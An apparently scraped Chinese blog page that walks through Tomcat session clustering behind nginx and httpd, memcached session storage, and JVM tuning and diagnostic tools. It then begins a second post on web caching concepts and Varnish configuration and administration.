测试访问：http://www.fenghong.tech/；实现同一cookie的客户端调度到同一后端server上\n  httpd反代启用管理接口：  \u0026lt;Location /balancer-manager\u0026gt; SetHandler balancer-manager ProxyPass ! Require all granted \u0026lt;/Location\u0026gt; nginx + nginx + tomcat cluster：基于源地址hash调度 前端nginx调度器：\n[root@Director ~]# vim /etc/nginx/conf.d/nginx_tomcat.conf upstream tcsrvs { ip_hash; server 192.168.0.10:80; server 192.168.0.11:80; } server { listen 80; server_name www.fenghong.tech; location / { proxy_pass http://tcsrvs; } } [root@Director ~]# nginx tomcat-node-1和tomcat-node-2：参考以上配置\n 测试访问：http://www.fenghong.tech/；实现同一IP的客户端调度到同一后端server上\n Tomcat的会话集群  session cluster：delta session manager；会话集群，对带宽消耗较大，集群规模建议3-5台   默认多播地址：228.0.0.4 多播通信使用的端口：45564 IP广播的方式来实现获取主机名，主机IP地址等，不能是监听在127.0.0.1 侦听复制消息的TCP端口是范围：4000-4100 必须配置集群会话监听器 各集群时间必须同步  前端nginx配置：\nupstream tcsrvs { server 192.168.0.10:80; server 192.168.0.11:80; } server { listen 80; server_name www.fenghong.tech; location / { proxy_pass http://tcsrvs; } } tomcat-node-1：\n[root@tomcat-node-1 ~]# vim /etc/tomcat/server.xml \u0026lt;Host name=\u0026quot;node1.fenghong.tech\u0026quot; appBase=\u0026quot;/data/webapp\u0026quot; unpackWARs=\u0026quot;true\u0026quot; autoDeploy=\u0026quot;true\u0026quot;\u0026gt; \u0026lt;Cluster className=\u0026quot;org.apache.catalina.ha.tcp.SimpleTcpCluster\u0026quot; channelSendOptions=\u0026quot;8\u0026quot;\u0026gt; #channelSendOptions：发送消息的信道选项，0-15 \u0026lt;Manager className=\u0026quot;org.apache.catalina.ha.session.DeltaManager\u0026quot; expireSessionsOnShutdown=\u0026quot;false\u0026quot; notifyListenersOnReplication=\u0026quot;true\u0026quot;/\u0026gt; #Manager：定义新的会话管理器DeltaManager #expireSessionsOnShutdown：一旦把当前Tomcat节点关闭，是否将这节点的Tomcat会话失效，false表示不失效 #notifyListenersOnReplication：现在如果要发送资源同步给其他节点，是否通知侦听器资源变动，必须打开 \u0026lt;Channel className=\u0026quot;org.apache.catalina.tribes.group.GroupChannel\u0026quot;\u0026gt; \u0026lt;Membership className=\u0026quot;org.apache.catalina.tribes.membership.McastService\u0026quot; address=\u0026quot;228.0.0.4\u0026quot; port=\u0026quot;45564\u0026quot; frequency=\u0026quot;500\u0026quot; dropTime=\u0026quot;3000\u0026quot;/\u0026gt; #McastService：多播通信 #address：多播通信地址 #port：端口 #frequency：每隔多长时间发送一次自己的心跳信息，单位ms #dropTime：在3000ms内没有收到对方的心跳信息表示已经不是集群成员了 \u0026lt;Receiver className=\u0026quot;org.apache.catalina.tribes.transport.nio.NioReceiver\u0026quot; address=\u0026quot;192.168.0.10\u0026quot; port=\u0026quot;4000\u0026quot; autoBind=\u0026quot;100\u0026quot; selectorTimeout=\u0026quot;5000\u0026quot; maxThreads=\u0026quot;6\u0026quot;/\u0026gt; #NioReceiver：异步IO #address：监听地址，需要修改为集群成员通信的网卡 #port：端口，如果不指定则自动选择4000-4100内从4000开始选择一个没有被占用的端口 #autoBind：自动绑定 #selectorTimeout：挑选器的超时时长 #maxThreads：最大线程数，集群成员节点数 - 1 \u0026lt;Sender className=\u0026quot;org.apache.catalina.tribes.transport.ReplicationTransmitter\u0026quot;\u0026gt; \u0026lt;Transport className=\u0026quot;org.apache.catalina.tribes.transport.nio.PooledParallelSender\u0026quot;/\u0026gt; \u0026lt;/Sender\u0026gt; \u0026lt;Interceptor className=\u0026quot;org.apache.catalina.tribes.group.interceptors.TcpFailureDetector\u0026quot;/\u0026gt; \u0026lt;Interceptor className=\u0026quot;org.apache.catalina.tribes.group.interceptors.MessageDispatch15Interceptor\u0026quot;/\u0026gt; \u0026lt;/Channel\u0026gt; #Channel：定义多播集群通信信道 #Membership：定义成员关系 #Receiver：接受器 #Sender：将自己的会话资源变动同步给其他节点 \u0026lt;Valve className=\u0026quot;org.apache.catalina.ha.tcp.ReplicationValve\u0026quot; filter=\u0026quot;\u0026quot;/\u0026gt; \u0026lt;Valve className=\u0026quot;org.apache.catalina.ha.session.JvmRouteBinderValve\u0026quot;/\u0026gt; \u0026lt;Deployer className=\u0026quot;org.apache.catalina.ha.deploy.FarmWarDeployer\u0026quot; tempDir=\u0026quot;/tmp/war-temp/\u0026quot; deployDir=\u0026quot;/tmp/war-deploy/\u0026quot; watchDir=\u0026quot;/tmp/war-listen/\u0026quot; watchEnabled=\u0026quot;false\u0026quot;/\u0026gt; \u0026lt;ClusterListener className=\u0026quot;org.apache.catalina.ha.session.JvmRouteSessionIDBinderListener\u0026quot;/\u0026gt; \u0026lt;ClusterListener className=\u0026quot;org.apache.catalina.ha.session.ClusterSessionListener\u0026quot;/\u0026gt; \u0026lt;/Cluster\u0026gt; \u0026lt;Valve className=\u0026quot;org.apache.catalina.valves.AccessLogValve\u0026quot; directory=\u0026quot;logs\u0026quot; prefix=\u0026quot;node1-dongfei-tech_access.\u0026quot; suffix=\u0026quot;.log\u0026quot; pattern=\u0026quot;%h %l %u %t \u0026amp;quot;%r\u0026amp;quot; %s %b\u0026quot; /\u0026gt; \u0026lt;/Host\u0026gt; [root@tomcat-node-1 ~]# mkdir /data/webapp/ROOT/WEB-INF [root@tomcat-node-1 ~]# cp /etc/tomcat/web.xml /data/webapp/ROOT/WEB-INF/ [root@tomcat-node-1 ~]# vim /data/webapp/ROOT/WEB-INF/web.xml \u0026lt;distributable/\u0026gt; #添加到web-app内 [root@tomcat-node-1 ~]# systemctl restart tomcat tomcat-node-2：\n[root@tomcat-node-2 ~]# vim /etc/tomcat/server.xml \u0026lt;Host name=\u0026quot;node2.fenghong.tech\u0026quot; appBase=\u0026quot;/data/webapp\u0026quot; unpackWARs=\u0026quot;true\u0026quot; autoDeploy=\u0026quot;true\u0026quot;\u0026gt; \u0026lt;Cluster className=\u0026quot;org.apache.catalina.ha.tcp.SimpleTcpCluster\u0026quot; channelSendOptions=\u0026quot;8\u0026quot;\u0026gt; \u0026lt;Manager className=\u0026quot;org.apache.catalina.ha.session.DeltaManager\u0026quot; expireSessionsOnShutdown=\u0026quot;false\u0026quot; notifyListenersOnReplication=\u0026quot;true\u0026quot;/\u0026gt; \u0026lt;Channel className=\u0026quot;org.apache.catalina.tribes.group.GroupChannel\u0026quot;\u0026gt; \u0026lt;Membership className=\u0026quot;org.apache.catalina.tribes.membership.McastService\u0026quot; address=\u0026quot;228.0.0.4\u0026quot; port=\u0026quot;45564\u0026quot; frequency=\u0026quot;500\u0026quot; dropTime=\u0026quot;3000\u0026quot;/\u0026gt; \u0026lt;Receiver className=\u0026quot;org.apache.catalina.tribes.transport.nio.NioReceiver\u0026quot; address=\u0026quot;192.168.0.11\u0026quot; port=\u0026quot;4000\u0026quot; autoBind=\u0026quot;100\u0026quot; selectorTimeout=\u0026quot;5000\u0026quot; maxThreads=\u0026quot;6\u0026quot;/\u0026gt; \u0026lt;Sender className=\u0026quot;org.apache.catalina.tribes.transport.ReplicationTransmitter\u0026quot;\u0026gt; \u0026lt;Transport className=\u0026quot;org.apache.catalina.tribes.transport.nio.PooledParallelSender\u0026quot;/\u0026gt; \u0026lt;/Sender\u0026gt; \u0026lt;Interceptor className=\u0026quot;org.apache.catalina.tribes.group.interceptors.TcpFailureDetector\u0026quot;/\u0026gt; \u0026lt;Interceptor className=\u0026quot;org.apache.catalina.tribes.group.interceptors.MessageDispatch15Interceptor\u0026quot;/\u0026gt; \u0026lt;/Channel\u0026gt; \u0026lt;Valve className=\u0026quot;org.apache.catalina.ha.tcp.ReplicationValve\u0026quot; filter=\u0026quot;\u0026quot;/\u0026gt; \u0026lt;Valve className=\u0026quot;org.apache.catalina.ha.session.JvmRouteBinderValve\u0026quot;/\u0026gt; \u0026lt;Deployer className=\u0026quot;org.apache.catalina.ha.deploy.FarmWarDeployer\u0026quot; tempDir=\u0026quot;/tmp/war-temp/\u0026quot; deployDir=\u0026quot;/tmp/war-deploy/\u0026quot; watchDir=\u0026quot;/tmp/war-listen/\u0026quot; watchEnabled=\u0026quot;false\u0026quot;/\u0026gt; \u0026lt;ClusterListener className=\u0026quot;org.apache.catalina.ha.session.JvmRouteSessionIDBinderListener\u0026quot;/\u0026gt; \u0026lt;ClusterListener className=\u0026quot;org.apache.catalina.ha.session.ClusterSessionListener\u0026quot;/\u0026gt; \u0026lt;/Cluster\u0026gt; \u0026lt;Valve className=\u0026quot;org.apache.catalina.valves.AccessLogValve\u0026quot; directory=\u0026quot;logs\u0026quot; prefix=\u0026quot;node2-dongfei-tech_access.\u0026quot; suffix=\u0026quot;.log\u0026quot; pattern=\u0026quot;%h %l %u %t \u0026amp;quot;%r\u0026amp;quot; %s %b\u0026quot; /\u0026gt; \u0026lt;/Host\u0026gt; [root@tomcat-node-2 ~]# mkdir /data/webapp/ROOT/WEB-INF [root@tomcat-node-2 ~]# cp /etc/tomcat/web.xml /data/webapp/ROOT/WEB-INF [root@tomcat-node-2 ~]# vim /data/webapp/ROOT/WEB-INF/web.xml \u0026lt;distributable/\u0026gt; #添加到web-app内 [root@tomcat-node-2 ~]# systemctl restart tomcat  需要在前端调度器做将会话绑定，配置后端的Tomcat会话集群一同使用\n 使用mencached保存Tomcat会话信息  session server：redis(store), memcached(cache)；利用会话服务器保存会话信息  mencached配置：\n[root@mem-1 ~]# yum install memcached -y [root@mem-1 ~]# systemctl start memcached [root@mem-1 ~]# ss -tnl |grep 11211 LISTEN 0 128 *:11211 *:* LISTEN 0 128 :::11211 :::* msm配置：在tomcat服务器中配置\n项目地址：https://github.com/magro/memcached-session-manager\n[root@tomcat-node-1 ~]# mkdir msm [root@tomcat-node-1 ~]# cd msm [root@tomcat-node-1 msm]# wget http://repo1.maven.org/maven2/de/javakaffee/msm/memcached-session-manager/2.3.0/memcached-session-manager-2.3.0.jar [root@tomcat-node-1 msm]# wget http://repo1.maven.org/maven2/de/javakaffee/msm/memcached-session-manager-tc7/2.3.0/memcached-session-manager-tc7-2.3.0.jar [root@tomcat-node-1 msm]# wget http://repo1.maven.org/maven2/net/spy/spymemcached/2.12.3/spymemcached-2.12.3.jar [root@tomcat-node-1 msm]# mkdir kryo [root@tomcat-node-1 msm]# cd kryo/ [root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/de/javakaffee/msm/msm-kryo-serializer/2.3.0/msm-kryo-serializer-2.3.0.jar [root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/de/javakaffee/kryo-serializers/0.42/kryo-serializers-0.42.jar [root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/com/esotericsoftware/kryo/4.0.2/kryo-4.0.2.jar [root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/com/esotericsoftware/minlog/1.3.0/minlog-1.3.0.jar [root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/com/esotericsoftware/reflectasm/1.11.7/reflectasm-1.11.7.jar [root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/org/ow2/asm/asm/6.2/asm-6.2.jar [root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/org/objenesis/objenesis/2.6/objenesis-2.6.jar [root@tomcat-node-1 ~]# tree msm/ msm/ ├── kryo │ ├── asm-6.2.jar │ ├── kryo-4.0.2.jar │ ├── kryo-serializers-0.42.jar │ ├── minlog-1.3.0.jar │ ├── msm-kryo-serializer-2.3.0.jar │ ├── objenesis-2.6.jar │ └── reflectasm-1.11.7.jar ├── memcached-session-manager-2.3.0.jar ├── memcached-session-manager-tc7-2.3.0.jar └── spymemcached-2.12.3.jar [root@tomcat-node-1 ~]# cp msm/*.jar /usr/share/java/tomcat/ [root@tomcat-node-1 ~]# scp msm/*.jar 192.168.0.11:/usr/share/java/tomcat/ [root@tomcat-node-1 ~]# scp msm/kryo/*.jar 192.168.0.11:/usr/share/java/tomcat/ tomcat-1配置：\n[root@tomcat-node-1 ~]# vim /etc/tomcat/server.xml \u0026lt;Host name=\u0026quot;node1.fenghong.tech\u0026quot; appBase=\u0026quot;/data/webapp\u0026quot; unpackWARs=\u0026quot;true\u0026quot; autoDeploy=\u0026quot;true\u0026quot;\u0026gt; \u0026lt;Context path=\u0026quot;/\u0026quot; docBase=\u0026quot;ROOT\u0026quot; reloadable=\u0026quot;\u0026quot;\u0026gt; \u0026lt;Manager className=\u0026quot;de.javakaffee.web.msm.MemcachedBackupSessionManager\u0026quot; memcachedNodes=\u0026quot;n1:192.168.0.12:11211,n2:192.168.0.13:11211\u0026quot; failoverNodes=\u0026quot;n2\u0026quot; requestUriIgnorePattern=\u0026quot;.*\\.(ico|png|gif|jpg|css|js)$\u0026quot; transcoderFactoryClass=\u0026quot;de.javakaffee.web.msm.serializer.kryo.KryoTranscoderFactory\u0026quot; /\u0026gt; \u0026lt;/Context\u0026gt; \u0026lt;Valve className=\u0026quot;org.apache.catalina.valves.AccessLogValve\u0026quot; directory=\u0026quot;logs\u0026quot; prefix=\u0026quot;node1-dongfei-tech_access.\u0026quot; suffix=\u0026quot;.log\u0026quot; pattern=\u0026quot;%h %l %u %t \u0026amp;quot;%r\u0026amp;quot; %s %b\u0026quot; /\u0026gt; \u0026lt;/Host\u0026gt; [root@tomcat-node-1 ~]# cat /data/webapp/ROOT/index.jsp \u0026lt;%@ page language=\u0026quot;java\u0026quot; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;TomcatA\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;font color=\u0026quot;red\u0026quot;\u0026gt;TomcatA.fenghong.tech\u0026lt;/font\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;table align=\u0026quot;centre\u0026quot; border=\u0026quot;1\u0026quot;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Session ID\u0026lt;/td\u0026gt; \u0026lt;% session.setAttribute(\u0026quot;fenghong.tech\u0026quot;,\u0026quot;fenghong.tech\u0026quot;); %\u0026gt; \u0026lt;td\u0026gt;\u0026lt;%= session.getId() %\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Created on\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;%= session.getCreationTime() %\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; tomcat-2配置：\n[root@tomcat-node-2 ~]# vim /etc/tomcat/server.xml \u0026lt;Host name=\u0026quot;node2.fenghong.tech\u0026quot; appBase=\u0026quot;/data/webapp\u0026quot; unpackWARs=\u0026quot;true\u0026quot; autoDeploy=\u0026quot;true\u0026quot;\u0026gt; \u0026lt;Context path=\u0026quot;/\u0026quot; docBase=\u0026quot;ROOT\u0026quot; reloadable=\u0026quot;\u0026quot;\u0026gt; \u0026lt;Manager className=\u0026quot;de.javakaffee.web.msm.MemcachedBackupSessionManager\u0026quot; memcachedNodes=\u0026quot;n1:192.168.0.12:11211,n2:192.168.0.13:11211\u0026quot; failoverNodes=\u0026quot;n2\u0026quot; requestUriIgnorePattern=\u0026quot;.*\\.(ico|png|gif|jpg|css|js)$\u0026quot; transcoderFactoryClass=\u0026quot;de.javakaffee.web.msm.serializer.kryo.KryoTranscoderFactory\u0026quot; /\u0026gt; \u0026lt;/Context\u0026gt; \u0026lt;Valve className=\u0026quot;org.apache.catalina.valves.AccessLogValve\u0026quot; directory=\u0026quot;logs\u0026quot; prefix=\u0026quot;node2-dongfei-tech_access.\u0026quot; suffix=\u0026quot;.log\u0026quot; pattern=\u0026quot;%h %l %u %t \u0026amp;quot;%r\u0026amp;quot; %s %b\u0026quot; /\u0026gt; \u0026lt;/Host\u0026gt; [root@tomcat-node-2 ~]# cat /data/webapp/ROOT/index.jsp \u0026lt;%@ page language=\u0026quot;java\u0026quot; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;TomcatB\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;font color=\u0026quot;blue\u0026quot;\u0026gt;TomcatB.fenghong.tech\u0026lt;/font\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;table align=\u0026quot;centre\u0026quot; border=\u0026quot;1\u0026quot;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Session ID\u0026lt;/td\u0026gt; \u0026lt;% session.setAttribute(\u0026quot;fenghong.tech\u0026quot;,\u0026quot;fenghong.tech\u0026quot;); %\u0026gt; \u0026lt;td\u0026gt;\u0026lt;%= session.getId() %\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Created on\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;%= session.getCreationTime() %\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  测试：\n访问www.fenghong.tech查看会话是否会变动\n将memcached-1停止会话是否正常保持\n Tomcat的常用优化配置  /etc/sysconfig/tomcat, /etc/tomcat/tomcat.conf  内存空间：\nJAVA_OPTS=\u0026quot;-server -Xms32g -Xmx32g -XX:NewSize= -XX:MaxNewSize= \u0026quot; -server：服务器模式 -Xms：堆内存初始化大小； -Xmx：堆内存空间上限； -XX:NewSize=：新生代空间初始化大小；\t-XX:MaxNewSize=：新生代空间最大值； 线程池设置：\n\u0026lt;Connector port=\u0026quot;8080\u0026quot; protocol=\u0026quot;HTTP/1.1\u0026quot; connectionTimeout=\u0026quot;20000\u0026quot; redirectPort=\u0026quot;8443\u0026quot; /\u0026gt; maxThreads：最大线程数； minSpareThreads：最小空闲线程数； maxSpareThreads：最大空闲线程数； acceptCount：等待队列的最大长度； URIEncoding：URI地址编码格式，建议使用UTF-8； enableLookups：是否启用dns解析，建议禁用； compression：是否启用传输压缩机制，建议“on\u0026quot;; compressionMinSize：启用压缩传输的数据流最小值，单位是字节； compressableMimeType：定义启用压缩功能的MIME类型； text/html, text/xml, text/css, text/javascript 禁用8005端口；\n\u0026lt;Server port=\u0026quot;-1\u0026quot; shutdown=\u0026quot;SHUTDOWN\u0026quot;\u0026gt; 隐藏版本信息：\n\u0026lt;Connector port=\u0026quot;8080\u0026quot; protocol=\u0026quot;HTTP/1.1\u0026quot; connectionTimeout=\u0026quot;20000\u0026quot; redirectPort=\u0026quot;8443\u0026quot; /\u0026gt; Server=\u0026quot;SOME STRING\u0026quot; JVM 内存分配参数：\n-Xmx：堆内存（新生代和老年代）的最大空间； -Xms：初始分配内存空间； -XX:NewSize：新生代空间大小； -Xms-(-XX:NewSize) -XX:MaxNewSize：新生代的最大空间； -Xmx-（-XX:MaxNewSize） 指定垃圾收集器：-XX:\nUseSerialGC：运行于Client模式下，新生代是Serial, 老年代使用SerialOld UseParNewGC：新生代使用ParNew，老年代使用SerialOld UseParalellGC：运行于server模式下，新生代使用Serial Scavenge, 老年代使用SerialOld UseParalessOldGC：新生代使用Paralell Scavenge, 老年代使用Paralell Old UseConcMarkSweepGC：新生代使用ParNew, 老年代优先使用CMS，备选方式为Serial Old CMSInitiatingOccupancyFraction：设定老年代空间占用比例达到多少后触发回收操作，默认为68%； UseCMSCompactAtFullCollection：CMS完成内存回收后是否要进行内存碎片整理； CMSFullGCsBeforeCompaction：在多次回收后执行一次内存碎片整理； ParalellGCThreads：并行GC线程的数量； JVM常用的分析工具：\n jps：用来查看运行的所有jvm进程； jinfo：查看进程的运行环境参数，主要是jvm命令行参数； jstat：对jvm应用程序的资源和性能进行实时监控； jstack：查看所有线程的运行状态； jmap：查看jvm占用物理内存的状态； jhat：+UseParNew jconsole： jvisualvm：  jps：Java virutal machine Process Status tool\njps [-q] [-mlvV] [\u0026lt;hostid\u0026gt;] -q：静默模式； -v：显示传递给jvm的命令行参数； -m：输出传入main方法的参数； -l：输出main类或jar完全限定名称； -V：显示通过flag文件传递给jvm的参数； [\u0026lt;hostid\u0026gt;]：主机id，默认为localhost； jinfo：输出给定的java进程的所有配置信息\njinfo [option] \u0026lt;pid\u0026gt; -flags：to print VM flags -sysprops：to print Java system properties -flag \u0026lt;name\u0026gt;：to print the value of the named VM flag jstack：查看指定的java进程的线程栈的相关信息\njstack [-l] \u0026lt;pid\u0026gt; jstack -F [-m] [-l] \u0026lt;pid\u0026gt; -l：long listings，会显示额外的锁信息，因此，发生死锁时常用此选项； -m：混合模式，既输出java堆栈信息，也输出C/C++堆栈信息； -F：当使用“jstack -l PID\u0026quot;无响应，可以使用-F强制输出信息； jstat：输出指定的java进程的统计信息\njstat -\u0026lt;option\u0026gt; [-t] [-h\u0026lt;lines\u0026gt;] \u0026lt;vmid\u0026gt; [\u0026lt;interval\u0026gt; [\u0026lt;count\u0026gt;]] -option： -class：class loader -compiler：JIT -gc：gc YGC：新生代的垃圾回收次数； YGCT：新生代垃圾回收消耗的时长； FGC：Full GC的次数； FGCT：Full GC消耗的时长； GCT：GC消耗的总时长； -gccapacity：统计堆中各代的容量 -gccause： -gcmetacapacity -gcnew：新生代 -gcnewcapacity -gcold：老年代 -gcoldcapacity -gcutil -printcompilation interval：时间间隔，单位是毫秒； count：显示的次数； jmap：Memory Map, 用于查看堆内存的使用状态\njhat：Java Heap Analysis Tool\njmap [option] \u0026lt;pid\u0026gt; jmap -heap \u0026lt;pid\u0026gt; #查看堆空间的详细信息 jmap -histo[:live] \u0026lt;pid\u0026gt; #查看堆内存中的对象的数目,live：只统计活动对象 jmap -dump:\u0026lt;dump-options\u0026gt; \u0026lt;pid\u0026gt; #保存堆内存数据至文件中，而后使用jvisualvm或jhat进行查看 dump-options: live format=b file=\u0026lt;file\u0026gt; 感谢阅读！\n","permalink":"https://www.fenghong.tech/blog/2018/2018-07-18-tomcat/","tags":["Linux","internet","server","tomcat"],"title":"Tomcat"},{"categories":["internet"],"contents":"摘要：\n 缓存相关的概念 varnish的介绍 varnish的管理及配置 多主机调度功能实现 ansible实现varnish  缓存相关概念简述   时间局部性：一个数据被访问过之后，可能很快会被再次访问到；\n  空间局部性：一个数据被访问时，其周边的数据也有可能被访问到\n  数据缓存：例如MySQL到web应用服务器之间的缓存服务器缓存的资源是数据缓存\n  页面缓存：接入层和应用层中间的缓存服务器缓存的是可缓存的页面，这层就是缓存层\n  缓存命中率：hit/(hit+miss)，一般高于30%命中率则是正向收益，好的设计系统可以达到80%到95%以上\n  字节命中率：按照数据的字节大小来计算命中率\n  请求命中率：按照请求的数量来计算命中率\n  代理式缓存：客户端访问缓存服务器，缓存服务器没有命中缓存时到后端服务器请求数据，此时它作为反向代理服务器工作，这种类型的缓存服务器叫做代理式缓存\n  旁挂式缓存：客户端亲自去查询数据库，并且将数据复制给缓存服务器一份，下次先去找缓存服务器，如果没有命中则再去数据库服务器查询，此时这种工作方式的缓存叫做旁挂式缓存，这个客户端叫做胖客户端（smart client）\n  private cache：私有缓存，用户代理附带的本地缓存机制\n  public cache：公共缓存，反向代理服务器的缓存功能\n  CND：Content Delivery Network 内容投递系统\n  GSLB：全网均衡调度\n  缓存有效性判断机制：\n 过期时间 条件式验证  Last-Modified/If-Modified-Since：基于文件的修改时间戳来判别 Etag/If-None-Match：基于文件的校验码来判别       过期时间验证缓存是否失效颗粒度太大，如果页面刚刚缓存应用服务器发生了变化，结果客户端拿到的就是过期数据；从而加入了条件式验证缓存的失效性，每次客户端请求到达缓存服务器，缓存服务器都要拿本地的数据和应用服务器的数据比较时间戳，如果时间戳发生了变化则缓存新的数据；这样虽然粒度小了，但是还是会有问题，如果应用服务器在同一秒页面数据变化了三次，而缓存服务器拿到的是第一份数据，这样还是会发生数据失效的问题；从而又引入了**Etag（扩展标记）**来标记唯一的页面数据。此时虽然解决了数据失效性的问题，但是每次客户端的请求都要去后端服务器做比较，对缓存和应用服务器都是不小的压力，我们不得不采取折中的解决方案就是“过期时间验证+条件式验证”，将不经常变动的页面做过期时间验证，变动频繁的采用条件式验证。\n 请求报文用于通知缓存服务如何使用缓存响应请求：\ncache-request-directive = \u0026quot;no-cache\u0026quot; 不能使用缓存系统中的缓存响应我，必须先去应用服务器做缓存验证 \u0026quot;no-store\u0026quot; 不能使用缓存系统中的缓存响应我，必须去应用服务器请求响应我 \u0026quot;max-age\u0026quot; \u0026quot;=\u0026quot; delta-seconds \u0026quot;max-stale\u0026quot; [ \u0026quot;=\u0026quot; delta-seconds ] \u0026quot;min-fresh\u0026quot; \u0026quot;=\u0026quot; delta-seconds \u0026quot;no-transform\u0026quot; \u0026quot;only-if-cached\u0026quot; cache-extension 响应报文用于通知缓存服务器如何存储上级服务器响应的内容：\ncache-response-directive = \u0026quot;public\u0026quot; 所有缓存系统都可以缓存 \u0026quot;private\u0026quot; [ \u0026quot;=\u0026quot; \u0026lt;\u0026quot;\u0026gt; 1#field-name \u0026lt;\u0026quot;\u0026gt; ] 仅能够被私有缓存所缓存 \u0026quot;no-cache\u0026quot; [ \u0026quot;=\u0026quot; \u0026lt;\u0026quot;\u0026gt; 1#field-name \u0026lt;\u0026quot;\u0026gt; ]，可缓存，但响应给客户端之前需要revalidation，即必须发出条件式请求进行缓存有效性验正 \u0026quot;no-store\u0026quot; ，不允许存储响应内容于缓存中 \u0026quot;no-transform\u0026quot; 不能转换格式 \u0026quot;must-revalidate\u0026quot; 必须重新验证 \u0026quot;proxy-revalidate\u0026quot; \u0026quot;max-age\u0026quot; \u0026quot;=\u0026quot; delta-seconds 私有缓存最大缓存时长 \u0026quot;s-maxage\u0026quot; \u0026quot;=\u0026quot; delta-seconds 公共缓存最大缓存时长 cache-extension  Web Page Cache解决方案：squid和varnish，它们的关系就像Apache和Nginx\n varnish介绍 Varnish cache，或称Varnish，是一套高性能的反向网站缓存服务器（reverse proxy server）\nvarnish官方站点： http://www.varnish-cache.org/\n varnish拥有俩套配置文件；一套配置文件用于varnish自身进程的参数配置，另一套用于定义缓存规则；定义缓存规则需要使用灵活的语言来定义，这就是VCL（varnish语言）；应用时需要将VCL编写的规则送给VCC编译后才能运行，所以安装varnish需要依赖gcc编译器。\n varnish的安装：yum install varnish -y，依赖epel源，目前CentOS7的epel源提供的版本是v4.0.5\nvarnish的程序环境：\n /etc/varnish/varnish.params： 配置varnish服务进程的工作特性，例如监听的地址和端口，缓存机制 /etc/varnish/default.vcl：配置各Child/Cache线程的缓存策略 /usr/sbin/varnishd：主程序 /usr/bin/varnishadm：命令行工具 /usr/bin/varnishhist： /usr/bin/varnishlog：查看内存中的日志 /usr/bin/varnishncsa：以NCSA格式查看日志 /usr/bin/varnishstat：查看缓存日志状态信息 /usr/bin/varnishtop：以rank方式查看日志 /usr/bin/varnishtest：测试工具程序 /usr/sbin/varnish_reload_vcl：VCL配置文件重载程序 /usr/lib/systemd/system/varnish.service：varnish服务 /usr/lib/systemd/system/varnishlog.service：日志持久的服务 /usr/lib/systemd/system/varnishncsa.service：日志持久的服务  管理工具 varnishd  -s [name=]type[,options] ：定义缓存数据的存储方式  malloc[,size]：内存存储，[,size]用于定义空间大小；重启后所有缓存项失效 file[,path[,size[,granularity]]]：磁盘文件存储，黑盒；重启后所有缓存项失效 persistent,path,size：文件存储，黑盒；重启后所有缓存项有效；实验阶段，不建议使用   -a address[:port][,address[:port][\u0026hellip;]：服务监听端口，默认为6081端口 -T address[:port]：管理服务监听端口，默认为6082端口 -f config：VCL配置文件 -F：运行于前台 -p param=value：设定运行参数及其值； 可重复使用多次 -r param[,param\u0026hellip;]: 设定指定的参数为只读状态  varnishstat # varnishstat -1 -f MAIN.cache_hit -f MAIN.cache_miss #显示指定参数的当前统计数据 # varnishstat -l -f MAIN -f MEMPOOL #列出指定配置段的每个参数的意义 varnishtop  -1：打印统计信息一次并退出，而不是持续更新的显示 -i taglist：可以同时使用多个-i选项，也可以一个选项跟上多个标签 -I \u0026lt;[taglist:]regex\u0026gt;：对指定的标签的值基于regex进行过滤 -x taglist：排除列表 -X \u0026lt;[taglist:]regex\u0026gt;：对指定的标签的值基于regex进行过滤，符合条件的予以排除  varnishadm # varnishadm -S /etc/varnish/secret -T 127.0.0.1:6082 #登录管理程序 help [\u0026lt;command\u0026gt;] 获取帮助 ping [\u0026lt;timestamp\u0026gt;] 测试服务器 auth \u0026lt;response\u0026gt; quit 退出cli banner status 显示状态 start 启动 stop 停止 vcl.load \u0026lt;configname\u0026gt; \u0026lt;filename\u0026gt; 加载VCL配置文件 vcl.inline \u0026lt;configname\u0026gt; \u0026lt;quoted_VCLstring\u0026gt; vcl.use \u0026lt;configname\u0026gt; 激活VCL配置文件 vcl.discard \u0026lt;configname\u0026gt; 删除VCL配置 vcl.list 列出VCL配置 param.show [-l] [\u0026lt;param\u0026gt;] 列出当前运行的参数 param.set \u0026lt;param\u0026gt; \u0026lt;value\u0026gt; 运行参数临时调整 panic.show panic.clear storage.list 列出数据存储信息 vcl.show [-v] \u0026lt;configname\u0026gt; 列出VCL详细配置 backend.list [\u0026lt;backend_expression\u0026gt;] 列出后端服务器 backend.set_health \u0026lt;backend_expression\u0026gt; \u0026lt;state\u0026gt; ban \u0026lt;field\u0026gt; \u0026lt;operator\u0026gt; \u0026lt;arg\u0026gt; [\u0026amp;\u0026amp; \u0026lt;field\u0026gt; \u0026lt;oper\u0026gt; \u0026lt;arg\u0026gt;]... ban.list 配置文件 默认配置文件：\nRELOAD_VCL=1 VARNISH_VCL_CONF=/etc/varnish/default.vcl 